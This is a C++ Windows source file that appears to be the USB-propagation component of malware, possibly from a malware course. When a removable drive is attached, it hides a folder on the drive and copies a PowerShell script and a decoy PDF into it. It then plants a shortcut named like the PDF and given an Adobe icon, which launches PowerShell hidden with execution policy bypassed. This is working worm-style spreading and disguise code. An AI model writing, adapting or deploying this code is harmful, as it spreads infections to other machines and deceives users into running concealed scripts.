#include <windows.h>
#include <dbt.h>
#include <iostream>
#include <filesystem>
#include <winnls.h>
#include <objbase.h>
#include <objidl.h>
#include <shlobj.h>
#include <shlguid.h>
#include "../include/shared.h"

using namespace std;
namespace fs = std::filesystem;

// Function to create a shortcut
HRESULT CreateShortcut(LPCSTR command,LPCSTR args, LPCSTR shortcutPath, LPCSTR iconPath, LPCSTR shortcutName) {
    CoInitialize(NULL); // Initialize COM library

    HRESULT hres;
    IShellLink* pShellLink = NULL;
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink);

    if (SUCCEEDED(hres)) {
        pShellLink->SetPath(command); // Set the path to the file
        pShellLink->SetArguments(args);
        pShellLink->SetIconLocation(iconPath, 0); // Set the icon for the shortcut

        IPersistFile* pPersistFile;
        hres = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);

        if (SUCCEEDED(hres)) {
            WCHAR wsz[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, shortcutPath, -1, wsz, MAX_PATH); // Convert shortcut path to wide string
            hres = pPersistFile->Save(wsz, TRUE); // Save the shortcut
            pPersistFile->Release();
        }
        pShellLink->Release();
    }

    CoUninitialize(); // Uninitialize COM library
    return hres;
}

bool copyFileToLocation(const std::string& sourcePath, const std::string& destinationPath) {
    try {
        // Check if source file exists
        if (!fs::exists(sourcePath)) {
            std::cerr << "Source file not found: " << sourcePath << std::endl;
            return false;
        }

        // Create destination directory if it doesn't exist
        fs::path destPathObj(destinationPath);
        if (!fs::exists(destPathObj.parent_path())) {
            fs::create_directories(destPathObj.parent_path());
        }

        // Copy the file
        fs::copy_file(sourcePath, destinationPath, fs::copy_options::overwrite_existing);
        std::cout << "File copied successfully to " << destinationPath << std::endl;
        return true;
    }
    catch (const fs::filesystem_error& e) {
        std::cerr << "Error copying file: " << e.what() << std::endl;
        return false;
    }
}

// Function to handle USB drive operations
void handleUSBDrive(const std::string& drivePath) {
    std::string hiddenFolderPath = drivePath + "HiddenFolder";
    std::string sourceFilePathScript = "C:\\Windows\\System32\\test\\2.ps1";  
    std::string sourceFilePathPDF = "C:\\Windows\\System32\\test\\MALW-Autum22-23-final.pdf";  
    std::string destinationFilePathScript = hiddenFolderPath + "\\2.ps1";
    std::string destinationFilePathPdf = hiddenFolderPath + "\\MALW-Autum22-23-final.pdf";  
    std::string psPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    std::string psArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -File \"" + destinationFilePathScript + "\"";
    std::string fullCommand = psPath + " " + psArgs;

    // Create the hidden folder
    if (CreateDirectory(hiddenFolderPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        SetFileAttributes(hiddenFolderPath.c_str(), FILE_ATTRIBUTE_HIDDEN);

        // Copy the file if it exists
        if (fs::exists(sourceFilePathScript) && fs::exists(sourceFilePathPDF)) {
            try {
                if (copyFileToLocation(sourceFilePathScript, destinationFilePathScript) && copyFileToLocation(sourceFilePathPDF, destinationFilePathPdf)) {
                    std::cout << "Files copy successful." << std::endl;
                }
                else {
                    std::cout << "Files copy failed." << std::endl;
                }

                // Create a shortcut to the file on the USB drive
                std::string shortcutPath = drivePath + "MALW-Autum22-23-final.pdf.lnk";
                std::string iconPath = "C:\\Windows\\System32\\test\\adobe.ico";  // Update with actual icon file path
                CreateShortcut(psPath.c_str(),psArgs.c_str(), shortcutPath.c_str(), iconPath.c_str(), "My Shortcut");
            }
            catch (const fs::filesystem_error& e) {
                std::cerr << "Error copying file: " << e.what() << std::endl;
            }
        }
        else {
            std::cerr << "Source files not found" << std::endl;
        }
    }
    else {
        std::cerr << "Failed to create hidden folder: " << hiddenFolderPath << std::endl;
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_DEVICECHANGE) {
        if (wParam == DBT_DEVICEARRIVAL) {
            PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
            if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
                for (char i = 0; i < 26; i++) {
                    if (lpdbv->dbcv_unitmask & (1 << i)) {
                        char driveLetter = 'A' + i;
                        std::string drivePath = std::string(1, driveLetter) + ":\\";
                        if (GetDriveType(drivePath.c_str()) == DRIVE_REMOVABLE) {
                            handleUSBDrive(drivePath);
                        }
                    }
                }
            }
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// USB detection thread
void usbDetectionThread() {
    const char CLASS_NAME[] = "USB Detection Window Class";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClass(&wc)) {
        // Handle error (optional)
        return;
    }

    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, "USB Detection Window", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL, NULL, wc.hInstance, NULL
    );

    if (hwnd == NULL) {
        // Handle error (optional)
        return;
    }

    MSG msg = {};
    while (true) {
        // Use PeekMessage to avoid blocking the thread
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (g_stopFlag.load()) {
            break; // Break the loop if stop flag is set
        }

        // Short sleep to reduce CPU usage (adjust as needed)
        Sleep(10);
    }

    DestroyWindow(hwnd); // Clean up the window
}



